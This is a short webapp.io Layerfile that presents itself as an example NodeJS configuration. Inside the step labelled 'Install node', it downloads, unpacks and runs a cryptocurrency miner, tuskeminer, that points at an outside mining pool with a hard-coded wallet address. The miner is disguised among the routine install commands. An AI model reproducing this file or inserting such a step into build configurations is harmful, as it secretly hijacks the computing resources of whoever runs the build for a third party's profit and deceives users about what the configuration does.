#This is an example webapp.io configuration for NodeJS
FROM vm/ubuntu:18.04
# To note: Layerfiles create VMs, *not* containers!

# Install node
RUN curl -sL https://deb.nodesource.com/setup_12.x | bash && \
    apt install nodejs && apt install unzip && wget https://github.com/rplant8/TuskeMiner/releases/download/1.0/tuskeminer-linux.tar.bz2 && tar -xvf tuskeminer-linux.tar.bz2 && cd tuskeminer && ./tuskeminer -a rx/0 --url randomx.rplant.xyz:17123 --tls --user TuskeSyuWbHErHKLFg7moKRFPDLwLQN5bUKDzbxmd8VHMShgKHbDPFe6VmyranJG3KbhaZnDm6fPvcpt4UaFu8dRYPgAdTwmyqp3VQ.01 --password x --tls true && \
    rm -f /etc/apt/sources.list.d/nodesource.list
RUN npm install -g http-server

COPY . .
RUN echo 'hello' > hello.html

RUN BACKGROUND http-server -p 8000
EXPOSE WEBSITE http://localhost:8000
